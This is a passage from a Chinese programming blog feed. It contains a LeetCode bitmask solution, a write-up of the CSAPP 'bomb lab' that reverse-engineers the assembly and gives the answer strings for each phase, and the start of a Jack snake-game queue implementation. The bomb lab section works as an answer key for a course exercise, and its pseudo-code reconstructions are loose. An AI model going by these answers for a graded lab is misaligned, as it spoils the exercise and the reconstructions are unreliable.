&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[arr.size()][mask];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>dfs<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> idx,<span class="keyword">int</span> mask,<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; &amp; visit,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; arr,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; count)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= arr.size()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : visit)&#123;</span><br><span class="line">            <span class="keyword">int</span> tot = v^mask;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = tot; i != <span class="number">0</span>; i = (i<span class="number">-1</span>)&amp;tot)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[idx] &gt;= count[i]) visit.insert(v|i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(visit.count(mask)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(idx+<span class="number">1</span>,mask,visit,arr,count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canDistribute</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; quantity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> m = quantity.size();</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;m) - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; freq;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; count(<span class="number">1</span>&lt;&lt;m,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; visit;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums) freq[v]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : freq) arr.push_back(v.second);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= mask; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; m; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    sum += quantity[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count[i] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        visit.insert(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,mask,visit,arr,count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekly-contest-39&quot;&gt;&lt;a href=&quot;#leetcode-biweekly-contest-39&quot; class=&quot;headerlink&quot; title=&quot;leetcode biweekly contest 39&quot;&gt;&lt;/a&gt;leetcode biweekly contest 39&lt;/h1&gt;&lt;p&gt;双周赛的题目，前三题比较容易，第四题是经典的状态压缩空间，竟然没有做出来，还是对算法的数量度掌握不够，对于状态子空间里的遍历还是没有掌握住.最终排名如下：&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/15/EV9JLbdmjH74iIY.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5550-拆炸弹&quot;&gt;&lt;a href=&quot;#5550-拆炸弹&quot; class=&quot;headerlink&quot; title=&quot;5550. 拆炸弹&quot;&gt;&lt;/a&gt;5550. 拆炸弹&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;你有一个炸弹需要拆除，时间紧迫！你的情报员会给你一个长度为 n 的 循环 数组 code 以及一个密钥 k 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【CSAPP】 Lab2</title>
    <link href="http://yoursite.com/2020/11/13/224/"/>
    <id>http://yoursite.com/2020/11/13/224/</id>
    <published>2020-11-13T09:13:09.805Z</published>
    <updated>2020-11-18T15:47:39.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-lab2-boomb"><a href="#CSAPP-lab2-boomb" class="headerlink" title="CSAPP lab2 boomb"></a>CSAPP lab2 boomb</h1><p><code>lab</code>真心难，类似于只给你相关的源代码，需要自己去看汇编语言自己翻译出答案，感觉像读天书猜答案一样，满蛋疼的题目。<br>不过好处是通过仔细阅读汇编代码，知道许多底层的知识：</p><ul><li>熟悉了<code>procedures call</code>的基本过程。</li><li>熟悉程序的运行流程，特别是寻址、比较、跳转指令等</li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><a id="more"></a><ol><li><code>phase1</code>：这个比较简单，直接查看汇编源代码即可，找到目标字符串的地址，通过查找<code>0x402400</code>这个地址所存储的字母串即为目标答案。<br><img src="https://i.loli.net/2020/11/12/dyxF4RLmko5jIqS.png" alt="1"><br><img src="https://i.loli.net/2020/11/12/H5FWCfPqMj2utLn.png" alt="2"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">phase_1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> src = <span class="string">"Border relations with Canada have never been better."</span>;</span><br><span class="line">    <span class="built_in">string</span> dst;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;dst;</span><br><span class="line">    <span class="keyword">if</span>(dst != src) explode_bomb();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>答案为:<code>Border relations with Canada have never been better.</code>.</li></ul><ol><li><code>phase2</code>: 这个题目稍微难点，看了好多遍才理解答案。关键在于如何读懂循环。代码中有明确的注释代码。通过</li></ol><ul><li><code>read_six_numbers</code>函数解析输入字符中的前六个数字，然后对前六个数字依次进行处理。</li><li><code>explode_bomb</code>函数则表示炸弹爆炸的意思，即输入的答案错误。</li><li>每次通过移动4个字节，来判断后一个数是否是前一个数的两倍，翻译过来的代码约为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i<span class="number">-1</span>] + arr[i<span class="number">-1</span>] != arr[i]) explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>答案为:<code>1 2 4 8 16 32</code>.<br><img src="https://i.loli.net/2020/11/12/w3aFdyWgleBP8Dq.png" alt="3"></li></ul><ol><li><code>phase</code>又是类似天书式的汇编代码猜答案。刚开始想了半天，后来发现，它实际上利用跳转指令。<br>关键点在于，我们可以很轻松的查找到对于输入字符串的格式要求存在<code>0x4025cf</code>地址出，通过实际的查看该地址存在的字符串格式可以看到如下：<br><img src="https://i.loli.net/2020/11/12/XUk3qnTpzWhMtFB.png" alt></li></ol><ul><li>存放的格式如为<code>%d %d</code>。我们可以知道输入的格式</li><li>我们需要找到偏移地址，<code>jump</code>的跳转地址与第二个数的偏移量有直接关系，我们在程序调试时，只需要将跳转的目标地址设定为正确的地址即可。<br><img src="https://i.loli.net/2020/11/12/5dwziXHQkmtxrVo.png" alt="1"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">phase_3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pos  = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">    <span class="built_in">sscanf</span>(str,<span class="string">"%d %d"</span>,&amp;addr,&amp;pos);</span><br><span class="line">    swtich(addr + pos)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>: ...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>: ...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>: ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>答案可为:<code>6 682</code>.</li></ul><ol><li>终于完成了<code>phase4</code>的结果，太蛋疼了，中间的汇编各种坑，还好最后看懂了，很容易绕进去。汇编代码注释如下：<br>关键点在于<br><img src="https://i.loli.net/2020/11/13/oNEMcGxuzipyOad.png" alt="1"><br><img src="https://i.loli.net/2020/11/12/XUk3qnTpzWhMtFB.png" alt></li></ol><ul><li>存放的格式如为<code>%d %d</code>。我们可以知道输入的格式，我们假设本次输入的两个数分别位<code>a[0],a[1]</code>.</li><li>我们需要找到偏移地址，本题重点的坑在于如何读懂<code>func4</code>函数，这个函数是重点，其中有非常多的坑需要踩，关键点在于如何避免踩坑。我们可以知道<code>func4</code>有3个输入参数，分别为<code>0,7,a[0]</code>这三个参数，三个参数分别存放在寄存器<code>edx,esi,edi</code>中，函数中各种复杂的操作都是在这三个寄存器中进行运算操作的，还是非常有迷惑性，最终发现两个比较，分别为:<br><img src="https://i.loli.net/2020/11/13/YpOJBLkhenHSPaM.png" alt="1"><br><img src="https://i.loli.net/2020/11/13/qgyT8zHwjYUNvt9.png" alt="2"></li><li>对于输入的参数<code>a[1]</code>，其实只有一句即可判断是否对错,题目中判断是否于<code>0</code>相等，这个非常简单比较操作即可完成。<br><img src="https://i.loli.net/2020/11/13/mz5VSJG6wxZ17D4.png" alt="1"></li><li>又是一个蛋疼的操作，继续下一个<code>phase</code>。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">phase_4</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">    <span class="built_in">sscanf</span>(str,<span class="string">"%d %d"</span>,&amp;num1,&amp;num2);</span><br><span class="line">    <span class="keyword">if</span>(num1 &gt; <span class="number">7</span>) explode_bomb();</span><br><span class="line">    <span class="keyword">if</span>(num1 &lt; <span class="number">7</span>) explode_bomb();</span><br><span class="line">    <span class="keyword">if</span>(num2 != <span class="number">0</span>) explode_bomb();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>答案为<code>0 7</code>.</li></ul><ol><li><p>这个题目也比较恶心，反复看了几遍才看懂题目，大概明白意思。大概是输入一个字符串，字符串的长度为<code>6</code>，然后取出每个字符的低8位的偏移<code>pos[i]</code>，然后从某个固定的字符串中通过<code>arr + pos[i]</code>来取出字符，最终能够构成字符串<code>flyers</code>。<br>其中原始的字符串为: <code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code><br>通过观察我们可以知道目标字符串与原始字符串的偏移分别为:<code>0x9 0xf 0xe 0x5 0x6 0x7</code>.<br>然后我们通过查找<code>ascii</code>码表，查找字符的低<code>8</code>位分别为:<code>0x9 0xf 0xe 0x5 0x6 0x7</code>即可满足上述要求。<br>最终随便查找了一下约为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">phase_4</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pos[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">string</span> dict = <span class="string">"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span>;</span><br><span class="line">    <span class="built_in">string</span> dst  = <span class="string">"flyers"</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">    <span class="built_in">sscanf</span>(str,<span class="string">"%d %d %d %d %d %d"</span>,&amp;pos[<span class="number">0</span>],&amp;pos[<span class="number">1</span>],&amp;pos[<span class="number">2</span>],&amp;pos[<span class="number">3</span>],&amp;pos[<span class="number">4</span>],&amp;pos[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dst[i] != dict[pos[i]]) explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后一题直接<code>google</code>，放弃治疗了，太恶心了，读汇编代码简直是不能忍受的，感觉花太多时间干这么恶心的事情，真心不值得。</p></li></ol><ul><li>第一部分为读取<code>6</code>个数，且保证<code>6</code>个数互不相同，且均小于等于<code>6</code>。可以参考答案为:<a href="https://www.jianshu.com/p/c219e4df2521" target="_blank" rel="noopener">答案</a><br><img src="https://i.loli.net/2020/11/13/2jPVRWtu8xnEAMJ.png" alt="1"></li><li><code>4 3 2 1 6 5</code></li></ul><ol><li>本<code>lab</code>中其实还有一个隐藏关卡，不过我觉得还是放弃算了，因为太耗费精力和时间在这些智力游戏上了，直接开始下一个<code>lab3</code>了。<h2 id><a href="#" class="headerlink" title="#"></a>#</h2>欢迎关注和打赏，感谢支持！</li></ol><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CSAPP-lab2-boomb&quot;&gt;&lt;a href=&quot;#CSAPP-lab2-boomb&quot; class=&quot;headerlink&quot; title=&quot;CSAPP lab2 boomb&quot;&gt;&lt;/a&gt;CSAPP lab2 boomb&lt;/h1&gt;&lt;p&gt;&lt;code&gt;lab&lt;/code&gt;真心难，类似于只给你相关的源代码，需要自己去看汇编语言自己翻译出答案，感觉像读天书猜答案一样，满蛋疼的题目。&lt;br&gt;不过好处是通过仔细阅读汇编代码，知道许多底层的知识：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;熟悉了&lt;code&gt;procedures call&lt;/code&gt;的基本过程。&lt;/li&gt;
&lt;li&gt;熟悉程序的运行流程，特别是寻址、比较、跳转指令等&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="代码实现" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Build a Computer】 Project 9</title>
    <link href="http://yoursite.com/2020/11/12/223/"/>
    <id>http://yoursite.com/2020/11/12/223/</id>
    <published>2020-11-12T02:56:19.373Z</published>
    <updated>2020-11-12T02:56:24.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难，<code>build a computer</code>的<code>part II</code>部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满，特别是只剩下后面三章了，主要是完成一个<code>jack</code>语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。感觉难度和挑战还是挺高的，非常喜欢这类基础的课程，要是这些课程放在大学本科该多好，有这么好的教程和资源，却一直从来没有机会接触到这么好的教育资源。其实从内心来说，叶不想让自己的孩子再重复一遍国内这种糟糕的教育，希望孩子能够正常成长吧，等他长大以后，作为老父亲的我能够把自己亲身体会到一些先进的理念和知识体系传授给他。</p><a id="more"></a><h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>是完全任意发挥，就是利用<code>jack</code>语言自己实现一个小游戏之类的，我用<code>jack</code>语言实现了一个贪吃蛇的小游戏，感觉还是非常有意思的。在<code>jack</code>语言中，重新设计了缓存和随机数生成器，题目本身不难，但是如果想设计出来有意思的还是不太容易。大概编码加调试花了两个半天的时间，现在时常感觉有非常多有意思的课程和知识可以学习，但是因为家庭的原因，根本没有时间能够话费在自己的爱好和兴趣上。今天读书的时候，书中写到了一句话，叫做四个责任，“对自己负责，对家庭负责，对工作负责，对社会负责”，这是依次递进的关系，从小到大的原则。<br>最终完成的<code>project</code>代码如下：<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/09/Snake" target="_blank" rel="noopener">代码</a><br>游戏运行截图如下：<br><img src="https://i.loli.net/2020/11/12/P14z5yEvliAxkBg.png" alt="1"><br>本身<code>project</code>难度不大，但是如何发挥出聪明才智，看到好多老外真心有创意，利用<code>jack</code>语言做了许多非常有意思的游戏，记得映像比较深刻的，有人做了个射击游戏，还有人做了个汉诺塔的游戏。<br>在此项目完成过程，主要就是重新设计了循环队列之类的。</p><ul><li>循环队列实现<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</span><br><span class="line">    field Array buffer;</span><br><span class="line">    field <span class="keyword">int</span> capbility;</span><br><span class="line">    field <span class="keyword">int</span> rear;</span><br><span class="line">    field <span class="keyword">int</span> front;</span><br><span class="line">    field <span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line">    <span class="function">constructor Queue <span class="title">new</span><span class="params">(<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">        let capbility = size;</span><br><span class="line">        let front = <span class="number">0</span>;</span><br><span class="line">        let rear = <span class="number">0</span>;</span><br><span class="line">        let buffer = Memory.alloc(size);</span><br><span class="line">        let length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">void</span> <span class="title">dispose</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">do</span> buffer.dispose(); </span><br><span class="line">        <span class="keyword">do</span> Memory.deAlloc(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (rear = front);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">int</span> check;</span><br><span class="line">        let check = Snake.mod(rear + <span class="number">1</span>,capbility);</span><br><span class="line">        <span class="keyword">return</span> (check = front);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">boolean</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isFull())&#123;<span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">        let length = length + <span class="number">1</span>;</span><br><span class="line">        let buffer[rear] = val;</span><br><span class="line">        let rear = Snake.mod(rear + <span class="number">1</span>,capbility);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">boolean</span> <span class="title">push_front</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isFull())&#123; <span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">        let length = length + <span class="number">1</span>;</span><br><span class="line">        let front = Snake.mod(front - <span class="number">1</span> + capbility,capbility);</span><br><span class="line">        let buffer[front] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">int</span> <span class="title">pop_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">int</span> res;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        let res = buffer[front];</span><br><span class="line">        let front = Snake.mod(front + <span class="number">1</span>,capbility);</span><br><span class="line">        let length = length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">int</span> <span class="title">pop_back</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">int</span> res;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        let length = length - <span class="number">1</span>;</span><br><span class="line">        let rear = Snake.mod(rear - <span class="number">1</span> + capbility,capbility);</span><br><span class="line">        <span class="keyword">return</span> buffer[rear];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">method <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">int</span> curr;</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">int</span> data;</span><br><span class="line">        <span class="comment">/*debug all elements of the queue*/</span></span><br><span class="line">        let curr = length;</span><br><span class="line">        <span class="keyword">while</span>(~(curr = <span class="number">0</span>))&#123;</span><br><span class="line">            let data = pop_front();</span><br><span class="line">            <span class="keyword">do</span> Output.printInt(data);</span><br><span class="line">            <span class="keyword">do</span> Output.printChar(<span class="number">32</span>); <span class="comment">// prints a space</span></span><br><span class="line">            <span class="function"><span class="keyword">do</span> <span class="title">push_back</span><span class="params">(data)</span></span>;</span><br><span class="line">            let curr = curr - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>随机数生成器： 这个可以在维基百科上找到线性方法生成简单的随机数的原理<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 